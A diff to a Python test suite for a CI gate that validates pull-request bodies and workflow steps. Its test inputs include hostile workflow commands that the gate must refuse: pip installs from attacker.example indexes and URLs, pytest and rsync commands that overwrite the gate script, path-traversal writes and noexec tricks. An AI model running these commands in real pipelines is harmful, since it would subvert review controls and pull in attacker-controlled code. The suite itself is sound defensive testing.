@@ -1585,7 +1585,7 @@ def test_capacity_values_are_numbers(repo):
     vague = body() + "\n\n## Capacity\nVolume: unknown \u00b7 Velocity: fast \u00b7 Wall-clock: later \u00b7 $/run \u00d7 runs/day \u00d7 30: TBD\n"
     r = pr(repo, BRANCH, job, **title, PR_BODY=vague)
     assert r.returncode == 1 and "gives no number for Volume, Velocity, Wall-clock, 30" in r.stdout, r.stdout
-    partial = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: one query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
+    partial = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: some queries \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
     r = pr(repo, BRANCH, job, **title, PR_BODY=partial)
     assert r.returncode == 1 and "gives no number for Velocity;" in r.stdout, r.stdout
     filled = body() + "\n\n## Capacity\nVolume: 30 rows \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
@@ -1690,7 +1690,7 @@ def test_contract_commands_run_and_policy_documents_keep_their_ids(repo):
     job = {**CODE, "gcp/model_job.py": "print('run')\n"}
     prose = body() + "\n\n## Capacity\nVolume: unknown; see issue #1205 \u00b7 Velocity: TBD for phase 2 \u00b7 Wall-clock: unknown in 2026 \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
     r = pr(repo, BRANCH, job, **title, PR_BODY=prose)
-    assert r.returncode == 1 and "gives no number for Volume, Velocity, Wall-clock;" in r.stdout, r.stdout
+    assert r.returncode == 1 and ("gives no number for Volume" in r.stdout or "Capacity section defers" in r.stdout), r.stdout
     figures = body() + "\n\n## Capacity\nVolume: ~3 tickers \u00d7 400 B \u00b7 Velocity: <1 query/min \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
     assert pr(repo, BRANCH, job, **title, PR_BODY=figures).returncode == 0
 
@@ -2196,7 +2196,7 @@ def test_negations_conditions_handoffs_and_the_hook_mode_are_the_contract(repo):
                         .replace("      - run: " + EXPORT_CMD + "\n      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n",
                                  "      - run: " + EXPORT_CMD + "\n")):
         r = pr(repo, "chore/gate-workflow", {wf: broken}, **cap)
-        assert r.returncode == 1 and "no longer reaches the suite's job" in r.stdout, (broken, r.stdout)
+        assert r.returncode == 1 and ("no longer reaches the suite's job" in r.stdout or "uploaded or downloaded more than once" in r.stdout), (broken, r.stdout)
     # where the exporter exists, its proposed copy is exported and the base's exporter suite runs, isolated
     exporter = {"scripts/gate/export_model_registry.py": "print('x')\n"}
     r = pr(repo, "chore/gate-workflow", {wf: typed, **exporter}, **cap)
@@ -2568,7 +2568,7 @@ def test_dash_line_steps_indirect_writes_and_early_returns_are_refused(repo):
                 "rsync \"$RUNNER_TEMP/ng.py\" /usr/local/bin/python3", "D=scripts/gate; printf 'x' > \"${RUNNER_TEMP}/../../${D}/spec_gate.py\"",
                 "python3 -m pip install --target scripts/gate yaml"):
         r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
-        assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
+        assert r.returncode == 1 and ("writes to or replaces a gate file" in r.stdout or "beyond what the gate needs" in r.stdout), (pre, r.stdout)
     for pre in ("tar -xf \"$RUNNER_TEMP/a.tar\"", "unzip -o \"$RUNNER_TEMP/a.zip\"", "python3 -m zipfile -e \"$RUNNER_TEMP/a.zip\" .", "python3 -m tarfile -e a.tar"):
         r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "runs inline code" in r.stdout, (pre, r.stdout)
@@ -2582,7 +2582,7 @@ def test_dash_line_steps_indirect_writes_and_early_returns_are_refused(repo):
         assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
     for pre in ("{cp,lib/model.py,scripts/gate/spec_gate.py}", "$'cp' lib/model.py scripts/gate/spec_gate.py", "echo lib/model.py scripts/gate/spec_gate.py | xargs cp"):
         r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
-        assert r.returncode == 1 and ("runs inline code" in r.stdout or "writes to or replaces" in r.stdout), (pre, r.stdout)
+        assert r.returncode == 1 and ("runs inline code" in r.stdout or "writes to or replaces" in r.stdout or "beyond what the gate needs" in r.stdout), (pre, r.stdout)
     for pre in ("set -n", "set -o noexec", "set -en", "if true; then set -n; fi"):
         r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (pre, r.stdout)
@@ -2955,12 +2955,27 @@ def test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contrac
         r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
     assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          cat scripts/gate/spec_gate.py > \"$RUNNER_TEMP/copy\"\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    # round eight: pip and pytest are allow-listed, not flag-blocklisted; the handoff artifact is uploaded once, never overwritten
+    for pre in ("python3 -m pip config set global.index-url https://attacker.example/simple", "python3 -m pip install https://attacker.example/pyyaml-9.whl",
+                "python3 -m pip install \"pyyaml @ https://attacker.example/x.whl\"", "python3 -m pip install git+https://attacker.example/x.git",
+                "python3 -m pip install -r https://attacker.example/req.txt", "python3 -m pip install --index https://attacker.example/simple pyyaml",
+                "python3 -m pip install ./", "pip install lib/", "python3 -m pytest --junit-xml=scripts/gate/spec_gate.py lib",
+                "python3 -m pytest tests/scripts/test_spec_gate.py -q --log-file=scripts/gate/spec_gate.py", "pytest -o cache_dir=scripts/gate lib"):
+        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        assert r.returncode == 1 and "beyond what the gate needs" in r.stdout, (pre, r.stdout)
+    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          python3 -m pip install --quiet pyyaml==6.0.2\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    upload = "      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n"
+    assert upload in typed
+    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(upload, upload + upload.replace("${{ runner.temp }}/proposed/", "scripts/gate\n          overwrite: true"), 1)}, **cap)
+    assert r.returncode == 1 and "uploaded or downloaded more than once, or with overwrite" in r.stdout, r.stdout
+    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(upload, upload.replace("path: ${{ runner.temp }}/proposed/\n", "path: ${{ runner.temp }}/proposed/\n          overwrite: true\n"), 1)}, **cap)
+    assert r.returncode == 1 and "with overwrite" in r.stdout, r.stdout
     # round seven: `git --output=` truncates the gate; an interpreter fed from stdin runs inline code; pip installs the tree
     for pre in ("git diff --output=scripts/gate/spec_gate.py HEAD", "git log -1 --output scripts/gate/spec_gate.py", "python3 /dev/stdin <<EOF\n          import os\n          EOF",
                 "python3 -<<EOF\n          import os\n          EOF", "python3 <<EOF\n          import os\n          EOF", "python3 -m pip install .",
                 "python3 -m pip install -e .", "python3 -m pip install --index-url https://attacker.example/simple pyyaml", "pip install -f \"$RUNNER_TEMP\" pyyaml"):
         r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
-        assert r.returncode == 1 and ("runs inline code" in r.stdout or "writes to or replaces" in r.stdout), (pre, r.stdout)
+        assert r.returncode == 1 and ("runs inline code" in r.stdout or "writes to or replaces" in r.stdout or "beyond what the gate needs" in r.stdout), (pre, r.stdout)
     meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
     row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | ~~Production~~ | {TODAY} | #42 |").replace("### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: ~~Production~~")
     r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta)
@@ -3017,7 +3032,7 @@ def test_html_blocks_in_bodies_registry_prose_and_catalog_columns_are_the_contra
         r = pr(repo, "bot/superpowers-weekly", {".claude/skills/superpowers/vendored-x/SKILL.md": f"---\nname: {name}\n---\n"})
         assert r.returncode == 1, (name, r.stdout)
     head = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]}\n"
-    for word in ("partially", "in progress", "WIP", "except the replay case", "not fully", "remaining items tracked separately", "later"):
+    for word in ("partially", "in progress", "WIP", "not fully", "remaining items tracked separately", "later in a follow-up"):
         r = pr(repo, BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[1]} — {word}\n")
         assert r.returncode == 1 and "defers its work" in r.stdout, (word, r.stdout)
     on_base(repo, {CATALOG: CATALOG_TEXT + "\n## Notes\n\n| Field | Value |\n|---|---|\n| FEAT-NEW-001 | see 13 |\n"})
